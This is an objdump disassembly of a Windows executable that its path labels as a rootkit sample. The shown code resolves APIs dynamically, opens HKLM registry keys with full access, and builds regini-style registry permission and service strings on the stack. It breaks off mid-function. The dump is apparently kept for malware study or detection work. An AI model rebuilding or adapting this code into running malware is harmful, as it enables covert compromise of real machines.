
malware_samples/rootkit/659e0d1b2405cadfa560fe648cbf6866720dd40bb6f4081d3dce2dffe20595d9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 40 00 00 00    	sub    $0x40,%esp
  401009:	90                   	nop
  40100a:	b8 00 30 40 00       	mov    $0x403000,%eax
  40100f:	50                   	push   %eax
  401010:	e8 43 19 00 00       	call   0x402958
  401015:	b9 0c 30 40 00       	mov    $0x40300c,%ecx
  40101a:	51                   	push   %ecx
  40101b:	50                   	push   %eax
  40101c:	e8 3f 19 00 00       	call   0x402960
  401021:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401024:	b8 00 00 00 00       	mov    $0x0,%eax
  401029:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40102c:	b8 38 00 00 00       	mov    $0x38,%eax
  401031:	50                   	push   %eax
  401032:	b8 00 00 00 00       	mov    $0x0,%eax
  401037:	50                   	push   %eax
  401038:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40103b:	50                   	push   %eax
  40103c:	e8 27 19 00 00       	call   0x402968
  401041:	83 c4 0c             	add    $0xc,%esp
  401044:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401049:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40104c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40104f:	83 c0 04             	add    $0x4,%eax
  401052:	b9 40 00 00 00       	mov    $0x40,%ecx
  401057:	89 08                	mov    %ecx,(%eax)
  401059:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40105c:	83 c0 08             	add    $0x8,%eax
  40105f:	b9 00 00 00 00       	mov    $0x0,%ecx
  401064:	89 08                	mov    %ecx,(%eax)
  401066:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401069:	83 c0 0c             	add    $0xc,%eax
  40106c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401071:	89 08                	mov    %ecx,(%eax)
  401073:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401076:	83 c0 10             	add    $0x10,%eax
  401079:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40107c:	89 08                	mov    %ecx,(%eax)
  40107e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401081:	83 c0 14             	add    $0x14,%eax
  401084:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401087:	89 08                	mov    %ecx,(%eax)
  401089:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40108c:	83 c0 18             	add    $0x18,%eax
  40108f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401092:	89 08                	mov    %ecx,(%eax)
  401094:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401097:	83 c0 1c             	add    $0x1c,%eax
  40109a:	b9 00 00 00 00       	mov    $0x0,%ecx
  40109f:	89 08                	mov    %ecx,(%eax)
  4010a1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010a4:	83 c0 20             	add    $0x20,%eax
  4010a7:	b9 00 00 00 00       	mov    $0x0,%ecx
  4010ac:	89 08                	mov    %ecx,(%eax)
  4010ae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010b1:	50                   	push   %eax
  4010b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4010b5:	ff d0                	call   *%eax
  4010b7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010ba:	83 c0 38             	add    $0x38,%eax
  4010bd:	8b 08                	mov    (%eax),%ecx
  4010bf:	83 f9 00             	cmp    $0x0,%ecx
  4010c2:	0f 84 14 00 00 00    	je     0x4010dc
  4010c8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010cb:	83 c0 38             	add    $0x38,%eax
  4010ce:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  4010d3:	51                   	push   %ecx
  4010d4:	8b 08                	mov    (%eax),%ecx
  4010d6:	51                   	push   %ecx
  4010d7:	e8 94 18 00 00       	call   0x402970
  4010dc:	c9                   	leave
  4010dd:	c3                   	ret
  4010de:	55                   	push   %ebp
  4010df:	89 e5                	mov    %esp,%ebp
  4010e1:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4010e7:	90                   	nop
  4010e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ed:	50                   	push   %eax
  4010ee:	b8 80 00 00 00       	mov    $0x80,%eax
  4010f3:	50                   	push   %eax
  4010f4:	b8 02 00 00 00       	mov    $0x2,%eax
  4010f9:	50                   	push   %eax
  4010fa:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ff:	50                   	push   %eax
  401100:	b8 03 00 00 00       	mov    $0x3,%eax
  401105:	50                   	push   %eax
  401106:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  40110b:	50                   	push   %eax
  40110c:	8b 45 08             	mov    0x8(%ebp),%eax
  40110f:	50                   	push   %eax
  401110:	e8 63 18 00 00       	call   0x402978
  401115:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401118:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40111b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40111e:	0f 84 45 00 00 00    	je     0x401169
  401124:	8b 45 0c             	mov    0xc(%ebp),%eax
  401127:	50                   	push   %eax
  401128:	e8 53 18 00 00       	call   0x402980
  40112d:	83 c4 04             	add    $0x4,%esp
  401130:	b9 00 00 00 00       	mov    $0x0,%ecx
  401135:	51                   	push   %ecx
  401136:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  401139:	51                   	push   %ecx
  40113a:	50                   	push   %eax
  40113b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40113e:	50                   	push   %eax
  40113f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401142:	50                   	push   %eax
  401143:	e8 40 18 00 00       	call   0x402988
  401148:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40114b:	50                   	push   %eax
  40114c:	e8 3f 18 00 00       	call   0x402990
  401151:	b8 00 00 00 00       	mov    $0x0,%eax
  401156:	50                   	push   %eax
  401157:	8b 45 08             	mov    0x8(%ebp),%eax
  40115a:	50                   	push   %eax
  40115b:	b8 1c 30 40 00       	mov    $0x40301c,%eax
  401160:	50                   	push   %eax
  401161:	e8 9a fe ff ff       	call   0x401000
  401166:	83 c4 0c             	add    $0xc,%esp
  401169:	b8 00 00 00 00       	mov    $0x0,%eax
  40116e:	e9 00 00 00 00       	jmp    0x401173
  401173:	c9                   	leave
  401174:	c3                   	ret
  401175:	55                   	push   %ebp
  401176:	89 e5                	mov    %esp,%ebp
  401178:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40117e:	90                   	nop
  40117f:	8b 45 08             	mov    0x8(%ebp),%eax
  401182:	50                   	push   %eax
  401183:	e8 10 18 00 00       	call   0x402998
  401188:	83 c4 04             	add    $0x4,%esp
  40118b:	b9 00 00 00 00       	mov    $0x0,%ecx
  401190:	51                   	push   %ecx
  401191:	b9 00 00 00 00       	mov    $0x0,%ecx
  401196:	51                   	push   %ecx
  401197:	b9 00 00 00 00       	mov    $0x0,%ecx
  40119c:	51                   	push   %ecx
  40119d:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011a2:	51                   	push   %ecx
  4011a3:	50                   	push   %eax
  4011a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4011a7:	50                   	push   %eax
  4011a8:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ad:	50                   	push   %eax
  4011ae:	b8 00 00 00 00       	mov    $0x0,%eax
  4011b3:	50                   	push   %eax
  4011b4:	e8 e7 17 00 00       	call   0x4029a0
  4011b9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4011bf:	83 c0 01             	add    $0x1,%eax
  4011c2:	50                   	push   %eax
  4011c3:	e8 e0 17 00 00       	call   0x4029a8
  4011c8:	83 c4 04             	add    $0x4,%esp
  4011cb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4011d1:	50                   	push   %eax
  4011d2:	e8 c1 17 00 00       	call   0x402998
  4011d7:	83 c4 04             	add    $0x4,%esp
  4011da:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011df:	51                   	push   %ecx
  4011e0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011e5:	51                   	push   %ecx
  4011e6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4011e9:	51                   	push   %ecx
  4011ea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011ed:	51                   	push   %ecx
  4011ee:	50                   	push   %eax
  4011ef:	8b 45 08             	mov    0x8(%ebp),%eax
  4011f2:	50                   	push   %eax
  4011f3:	b8 00 00 00 00       	mov    $0x0,%eax
  4011f8:	50                   	push   %eax
  4011f9:	b8 00 00 00 00       	mov    $0x0,%eax
  4011fe:	50                   	push   %eax
  4011ff:	e8 9c 17 00 00       	call   0x4029a0
  401204:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401207:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40120a:	01 c8                	add    %ecx,%eax
  40120c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401211:	88 08                	mov    %cl,(%eax)
  401213:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401216:	e9 00 00 00 00       	jmp    0x40121b
  40121b:	c9                   	leave
  40121c:	c3                   	ret
  40121d:	55                   	push   %ebp
  40121e:	89 e5                	mov    %esp,%ebp
  401220:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401226:	90                   	nop
  401227:	b8 00 00 00 00       	mov    $0x0,%eax
  40122c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40122f:	b8 00 00 00 00       	mov    $0x0,%eax
  401234:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401237:	b8 00 00 00 00       	mov    $0x0,%eax
  40123c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40123f:	b8 23 30 40 00       	mov    $0x403023,%eax
  401244:	50                   	push   %eax
  401245:	e8 0e 17 00 00       	call   0x402958
  40124a:	b9 30 30 40 00       	mov    $0x403030,%ecx
  40124f:	51                   	push   %ecx
  401250:	50                   	push   %eax
  401251:	e8 0a 17 00 00       	call   0x402960
  401256:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401259:	b8 40 30 40 00       	mov    $0x403040,%eax
  40125e:	50                   	push   %eax
  40125f:	e8 f4 16 00 00       	call   0x402958
  401264:	b9 4d 30 40 00       	mov    $0x40304d,%ecx
  401269:	51                   	push   %ecx
  40126a:	50                   	push   %eax
  40126b:	e8 f0 16 00 00       	call   0x402960
  401270:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401273:	b8 5e 30 40 00       	mov    $0x40305e,%eax
  401278:	50                   	push   %eax
  401279:	e8 da 16 00 00       	call   0x402958
  40127e:	b9 6b 30 40 00       	mov    $0x40306b,%ecx
  401283:	51                   	push   %ecx
  401284:	50                   	push   %eax
  401285:	e8 d6 16 00 00       	call   0x402960
  40128a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40128d:	b8 00 00 00 00       	mov    $0x0,%eax
  401292:	50                   	push   %eax
  401293:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401296:	50                   	push   %eax
  401297:	b8 00 00 00 00       	mov    $0x0,%eax
  40129c:	50                   	push   %eax
  40129d:	b8 3f 00 0f 00       	mov    $0xf003f,%eax
  4012a2:	50                   	push   %eax
  4012a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4012a8:	50                   	push   %eax
  4012a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4012ae:	50                   	push   %eax
  4012af:	b8 00 00 00 00       	mov    $0x0,%eax
  4012b4:	50                   	push   %eax
  4012b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4012b8:	50                   	push   %eax
  4012b9:	b8 02 00 00 80       	mov    $0x80000002,%eax
  4012be:	50                   	push   %eax
  4012bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4012c2:	ff d0                	call   *%eax
  4012c4:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012c9:	39 c1                	cmp    %eax,%ecx
  4012cb:	0f 84 0a 00 00 00    	je     0x4012db
  4012d1:	b8 00 00 00 00       	mov    $0x0,%eax
  4012d6:	e9 e3 01 00 00       	jmp    0x4014be
  4012db:	b8 00 00 00 00       	mov    $0x0,%eax
  4012e0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4012e3:	b8 04 00 00 00       	mov    $0x4,%eax
  4012e8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4012eb:	b8 00 02 00 00       	mov    $0x200,%eax
  4012f0:	50                   	push   %eax
  4012f1:	e8 b2 16 00 00       	call   0x4029a8
  4012f6:	83 c4 04             	add    $0x4,%esp
  4012f9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4012fc:	b8 00 02 00 00       	mov    $0x200,%eax
  401301:	50                   	push   %eax
  401302:	b8 00 00 00 00       	mov    $0x0,%eax
  401307:	50                   	push   %eax
  401308:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40130b:	50                   	push   %eax
  40130c:	e8 57 16 00 00       	call   0x402968
  401311:	83 c4 0c             	add    $0xc,%esp
  401314:	b8 00 02 00 00       	mov    $0x200,%eax
  401319:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40131c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40131f:	50                   	push   %eax
  401320:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401323:	50                   	push   %eax
  401324:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401327:	50                   	push   %eax
  401328:	b8 00 00 00 00       	mov    $0x0,%eax
  40132d:	50                   	push   %eax
  40132e:	b8 78 30 40 00       	mov    $0x403078,%eax
  401333:	50                   	push   %eax
  401334:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401337:	50                   	push   %eax
  401338:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40133b:	ff d0                	call   *%eax
  40133d:	83 f8 00             	cmp    $0x0,%eax
  401340:	0f 84 05 00 00 00    	je     0x40134b
  401346:	e9 3e 01 00 00       	jmp    0x401489
  40134b:	b8 00 02 00 00       	mov    $0x200,%eax
  401350:	50                   	push   %eax
  401351:	b8 00 00 00 00       	mov    $0x0,%eax
  401356:	50                   	push   %eax
  401357:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40135a:	50                   	push   %eax
  40135b:	e8 08 16 00 00       	call   0x402968
  401360:	83 c4 0c             	add    $0xc,%esp
  401363:	b8 00 02 00 00       	mov    $0x200,%eax
  401368:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40136b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40136e:	50                   	push   %eax
  40136f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401372:	50                   	push   %eax
  401373:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401376:	50                   	push   %eax
  401377:	b8 00 00 00 00       	mov    $0x0,%eax
  40137c:	50                   	push   %eax
  40137d:	b8 92 30 40 00       	mov    $0x403092,%eax
  401382:	50                   	push   %eax
  401383:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401386:	50                   	push   %eax
  401387:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40138a:	ff d0                	call   *%eax
  40138c:	83 f8 00             	cmp    $0x0,%eax
  40138f:	0f 84 05 00 00 00    	je     0x40139a
  401395:	e9 ef 00 00 00       	jmp    0x401489
  40139a:	b8 00 02 00 00       	mov    $0x200,%eax
  40139f:	50                   	push   %eax
  4013a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4013a5:	50                   	push   %eax
  4013a6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013a9:	50                   	push   %eax
  4013aa:	e8 b9 15 00 00       	call   0x402968
  4013af:	83 c4 0c             	add    $0xc,%esp
  4013b2:	b8 00 02 00 00       	mov    $0x200,%eax
  4013b7:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013ba:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4013bd:	50                   	push   %eax
  4013be:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013c1:	50                   	push   %eax
  4013c2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4013c5:	50                   	push   %eax
  4013c6:	b8 00 00 00 00       	mov    $0x0,%eax
  4013cb:	50                   	push   %eax
  4013cc:	b8 9e 30 40 00       	mov    $0x40309e,%eax
  4013d1:	50                   	push   %eax
  4013d2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013d5:	50                   	push   %eax
  4013d6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4013d9:	ff d0                	call   *%eax
  4013db:	83 f8 00             	cmp    $0x0,%eax
  4013de:	0f 84 05 00 00 00    	je     0x4013e9
  4013e4:	e9 a0 00 00 00       	jmp    0x401489
  4013e9:	b8 01 00 00 00       	mov    $0x1,%eax
  4013ee:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4013f1:	b8 00 02 00 00       	mov    $0x200,%eax
  4013f6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013f9:	b8 00 02 00 00       	mov    $0x200,%eax
  4013fe:	50                   	push   %eax
  4013ff:	b8 00 00 00 00       	mov    $0x0,%eax
  401404:	50                   	push   %eax
  401405:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401408:	50                   	push   %eax
  401409:	e8 5a 15 00 00       	call   0x402968
  40140e:	83 c4 0c             	add    $0xc,%esp
  401411:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401414:	50                   	push   %eax
  401415:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401418:	50                   	push   %eax
  401419:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40141c:	50                   	push   %eax
  40141d:	b8 00 00 00 00       	mov    $0x0,%eax
  401422:	50                   	push   %eax
  401423:	b8 a8 30 40 00       	mov    $0x4030a8,%eax
  401428:	50                   	push   %eax
  401429:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40142c:	50                   	push   %eax
  40142d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401430:	ff d0                	call   *%eax
  401432:	83 f8 00             	cmp    $0x0,%eax
  401435:	0f 84 0a 00 00 00    	je     0x401445
  40143b:	e9 49 00 00 00       	jmp    0x401489
  401440:	e9 3c 00 00 00       	jmp    0x401481
  401445:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401448:	50                   	push   %eax
  401449:	e8 27 fd ff ff       	call   0x401175
  40144e:	83 c4 04             	add    $0x4,%esp
  401451:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401454:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401457:	83 f8 00             	cmp    $0x0,%eax
  40145a:	0f 84 21 00 00 00    	je     0x401481
  401460:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401463:	83 c0 04             	add    $0x4,%eax
  401466:	50                   	push   %eax
  401467:	8b 45 0c             	mov    0xc(%ebp),%eax
  40146a:	50                   	push   %eax
  40146b:	e8 40 15 00 00       	call   0x4029b0
  401470:	83 c4 08             	add    $0x8,%esp
  401473:	83 f8 00             	cmp    $0x0,%eax
  401476:	0f 84 05 00 00 00    	je     0x401481
  40147c:	e9 08 00 00 00       	jmp    0x401489
  401481:	b8 01 00 00 00       	mov    $0x1,%eax
  401486:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401489:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40148c:	83 f8 00             	cmp    $0x0,%eax
  40148f:	0f 84 0c 00 00 00    	je     0x4014a1
  401495:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401498:	50                   	push   %eax
  401499:	e8 1a 15 00 00       	call   0x4029b8
  40149e:	83 c4 04             	add    $0x4,%esp
  4014a1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4014a4:	50                   	push   %eax
  4014a5:	e8 0e 15 00 00       	call   0x4029b8
  4014aa:	83 c4 04             	add    $0x4,%esp
  4014ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014b0:	50                   	push   %eax
  4014b1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4014b4:	ff d0                	call   *%eax
  4014b6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4014b9:	e9 00 00 00 00       	jmp    0x4014be
  4014be:	c9                   	leave
  4014bf:	c3                   	ret
  4014c0:	55                   	push   %ebp
  4014c1:	89 e5                	mov    %esp,%ebp
  4014c3:	81 ec 9c 04 00 00    	sub    $0x49c,%esp
  4014c9:	90                   	nop
  4014ca:	b8 48 00 00 00       	mov    $0x48,%eax
  4014cf:	88 85 6d ff ff ff    	mov    %al,-0x93(%ebp)
  4014d5:	b8 4b 00 00 00       	mov    $0x4b,%eax
  4014da:	88 85 6e ff ff ff    	mov    %al,-0x92(%ebp)
  4014e0:	b8 45 00 00 00       	mov    $0x45,%eax
  4014e5:	88 85 6f ff ff ff    	mov    %al,-0x91(%ebp)
  4014eb:	b8 59 00 00 00       	mov    $0x59,%eax
  4014f0:	88 85 70 ff ff ff    	mov    %al,-0x90(%ebp)
  4014f6:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4014fb:	88 85 71 ff ff ff    	mov    %al,-0x8f(%ebp)
  401501:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401506:	88 85 72 ff ff ff    	mov    %al,-0x8e(%ebp)
  40150c:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401511:	88 85 73 ff ff ff    	mov    %al,-0x8d(%ebp)
  401517:	b8 43 00 00 00       	mov    $0x43,%eax
  40151c:	88 85 74 ff ff ff    	mov    %al,-0x8c(%ebp)
  401522:	b8 41 00 00 00       	mov    $0x41,%eax
  401527:	88 85 75 ff ff ff    	mov    %al,-0x8b(%ebp)
  40152d:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401532:	88 85 76 ff ff ff    	mov    %al,-0x8a(%ebp)
  401538:	b8 5f 00 00 00       	mov    $0x5f,%eax
  40153d:	88 85 77 ff ff ff    	mov    %al,-0x89(%ebp)
  401543:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401548:	88 85 78 ff ff ff    	mov    %al,-0x88(%ebp)
  40154e:	b8 41 00 00 00       	mov    $0x41,%eax
  401553:	88 85 79 ff ff ff    	mov    %al,-0x87(%ebp)
  401559:	b8 43 00 00 00       	mov    $0x43,%eax
  40155e:	88 85 7a ff ff ff    	mov    %al,-0x86(%ebp)
  401564:	b8 48 00 00 00       	mov    $0x48,%eax
  401569:	88 85 7b ff ff ff    	mov    %al,-0x85(%ebp)
  40156f:	b8 49 00 00 00       	mov    $0x49,%eax
  401574:	88 85 7c ff ff ff    	mov    %al,-0x84(%ebp)
  40157a:	b8 4e 00 00 00       	mov    $0x4e,%eax
  40157f:	88 85 7d ff ff ff    	mov    %al,-0x83(%ebp)
  401585:	b8 45 00 00 00       	mov    $0x45,%eax
  40158a:	88 85 7e ff ff ff    	mov    %al,-0x82(%ebp)
  401590:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401595:	88 85 7f ff ff ff    	mov    %al,-0x81(%ebp)
  40159b:	b8 25 00 00 00       	mov    $0x25,%eax
  4015a0:	88 45 80             	mov    %al,-0x80(%ebp)
  4015a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4015a8:	88 45 81             	mov    %al,-0x7f(%ebp)
  4015ab:	b8 20 00 00 00       	mov    $0x20,%eax
  4015b0:	88 45 82             	mov    %al,-0x7e(%ebp)
  4015b3:	b8 5b 00 00 00       	mov    $0x5b,%eax
  4015b8:	88 45 83             	mov    %al,-0x7d(%ebp)
  4015bb:	b8 31 00 00 00       	mov    $0x31,%eax
  4015c0:	88 45 84             	mov    %al,-0x7c(%ebp)
  4015c3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015c8:	88 45 85             	mov    %al,-0x7b(%ebp)
  4015cb:	b8 37 00 00 00       	mov    $0x37,%eax
  4015d0:	88 45 86             	mov    %al,-0x7a(%ebp)
  4015d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015d8:	88 45 87             	mov    %al,-0x79(%ebp)
  4015db:	b8 31 00 00 00       	mov    $0x31,%eax
  4015e0:	88 45 88             	mov    %al,-0x78(%ebp)
  4015e3:	b8 37 00 00 00       	mov    $0x37,%eax
  4015e8:	88 45 89             	mov    %al,-0x77(%ebp)
  4015eb:	b8 5d 00 00 00       	mov    $0x5d,%eax
  4015f0:	88 45 8a             	mov    %al,-0x76(%ebp)
  4015f3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4015f8:	88 45 8b             	mov    %al,-0x75(%ebp)
  4015fb:	b8 0a 00 00 00       	mov    $0xa,%eax
  401600:	88 45 8c             	mov    %al,-0x74(%ebp)
  401603:	b8 48 00 00 00       	mov    $0x48,%eax
  401608:	88 45 8d             	mov    %al,-0x73(%ebp)
  40160b:	b8 4b 00 00 00       	mov    $0x4b,%eax
  401610:	88 45 8e             	mov    %al,-0x72(%ebp)
  401613:	b8 45 00 00 00       	mov    $0x45,%eax
  401618:	88 45 8f             	mov    %al,-0x71(%ebp)
  40161b:	b8 59 00 00 00       	mov    $0x59,%eax
  401620:	88 45 90             	mov    %al,-0x70(%ebp)
  401623:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401628:	88 45 91             	mov    %al,-0x6f(%ebp)
  40162b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401630:	88 45 92             	mov    %al,-0x6e(%ebp)
  401633:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401638:	88 45 93             	mov    %al,-0x6d(%ebp)
  40163b:	b8 43 00 00 00       	mov    $0x43,%eax
  401640:	88 45 94             	mov    %al,-0x6c(%ebp)
  401643:	b8 41 00 00 00       	mov    $0x41,%eax
  401648:	88 45 95             	mov    %al,-0x6b(%ebp)
  40164b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401650:	88 45 96             	mov    %al,-0x6a(%ebp)
  401653:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401658:	88 45 97             	mov    %al,-0x69(%ebp)
  40165b:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401660:	88 45 98             	mov    %al,-0x68(%ebp)
  401663:	b8 41 00 00 00       	mov    $0x41,%eax
  401668:	88 45 99             	mov    %al,-0x67(%ebp)
  40166b:	b8 43 00 00 00       	mov    $0x43,%eax
  401670:	88 45 9a             	mov    %al,-0x66(%ebp)
  401673:	b8 48 00 00 00       	mov    $0x48,%eax
  401678:	88 45 9b             	mov    %al,-0x65(%ebp)
  40167b:	b8 49 00 00 00       	mov    $0x49,%eax
  401680:	88 45 9c             	mov    %al,-0x64(%ebp)
  401683:	b8 4e 00 00 00       	mov    $0x4e,%eax
  401688:	88 45 9d             	mov    %al,-0x63(%ebp)
  40168b:	b8 45 00 00 00       	mov    $0x45,%eax
  401690:	88 45 9e             	mov    %al,-0x62(%ebp)
  401693:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401698:	88 45 9f             	mov    %al,-0x61(%ebp)
  40169b:	b8 25 00 00 00       	mov    $0x25,%eax
  4016a0:	88 45 a0             	mov    %al,-0x60(%ebp)
  4016a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4016a8:	88 45 a1             	mov    %al,-0x5f(%ebp)
  4016ab:	b8 0d 00 00 00       	mov    $0xd,%eax
  4016b0:	88 45 a2             	mov    %al,-0x5e(%ebp)
  4016b3:	b8 0a 00 00 00       	mov    $0xa,%eax
  4016b8:	88 45 a3             	mov    %al,-0x5d(%ebp)
  4016bb:	b8 45 00 00 00       	mov    $0x45,%eax
  4016c0:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4016c3:	b8 72 00 00 00       	mov    $0x72,%eax
  4016c8:	88 45 a5             	mov    %al,-0x5b(%ebp)
  4016cb:	b8 72 00 00 00       	mov    $0x72,%eax
  4016d0:	88 45 a6             	mov    %al,-0x5a(%ebp)
  4016d3:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016d8:	88 45 a7             	mov    %al,-0x59(%ebp)
  4016db:	b8 72 00 00 00       	mov    $0x72,%eax
  4016e0:	88 45 a8             	mov    %al,-0x58(%ebp)
  4016e3:	b8 43 00 00 00       	mov    $0x43,%eax
  4016e8:	88 45 a9             	mov    %al,-0x57(%ebp)
  4016eb:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016f0:	88 45 aa             	mov    %al,-0x56(%ebp)
  4016f3:	b8 6e 00 00 00       	mov    $0x6e,%eax
  4016f8:	88 45 ab             	mov    %al,-0x55(%ebp)
  4016fb:	b8 74 00 00 00       	mov    $0x74,%eax
  401700:	88 45 ac             	mov    %al,-0x54(%ebp)
  401703:	b8 72 00 00 00       	mov    $0x72,%eax
  401708:	88 45 ad             	mov    %al,-0x53(%ebp)
  40170b:	b8 6f 00 00 00       	mov    $0x6f,%eax
  401710:	88 45 ae             	mov    %al,-0x52(%ebp)
  401713:	b8 6c 00 00 00       	mov    $0x6c,%eax
  401718:	88 45 af             	mov    %al,-0x51(%ebp)
  40171b:	b8 20 00 00 00       	mov    $0x20,%eax
  401720:	88 45 b0             	mov    %al,-0x50(%ebp)
  401723:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401728:	88 45 b1             	mov    %al,-0x4f(%ebp)
  40172b:	b8 20 00 00 00       	mov    $0x20,%eax
  401730:	88 45 b2             	mov    %al,-0x4e(%ebp)
  401733:	b8 52 00 00 00       	mov    $0x52,%eax
  401738:	88 45 b3             	mov    %al,-0x4d(%ebp)
  40173b:	b8 45 00 00 00       	mov    $0x45,%eax
  401740:	88 45 b4             	mov    %al,-0x4c(%ebp)
  401743:	b8 47 00 00 00       	mov    $0x47,%eax
  401748:	88 45 b5             	mov    %al,-0x4b(%ebp)
  40174b:	b8 5f 00 00 00       	mov    $0x5f,%eax
